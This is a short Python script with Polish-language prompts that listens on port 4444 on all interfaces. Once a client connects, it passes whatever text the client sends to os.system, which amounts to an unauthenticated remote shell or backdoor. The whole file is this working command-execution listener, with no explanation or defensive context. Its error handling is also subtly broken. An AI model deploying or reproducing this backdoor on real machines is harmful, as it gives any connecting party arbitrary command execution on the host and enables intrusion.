import socket
import os

server_socket = socket.socket()
server_socket.bind(("0.0.0.0", 4444))
server_socket.listen(2)
conn, addr = server_socket.accept()
while True:
    try:
        message = input("Wpisz cokolwiek aby otrzymać polecenie od klienta: ")
        conn.send(message.encode())
        client_data = conn.recv(2048).decode()
        if client_data == "exit" or message == "exit":
            print("Zamykanie połączenia...")
            server_socket.close()
            break
        else:
            os.system(client_data)
            print("Użytkownik uruchomił polecenie: ", client_data)
    except Exception as error:
        if "ConnectionAbortedError" in error:
            print("Serwer zakończył połączenie")
            server_socket.close()
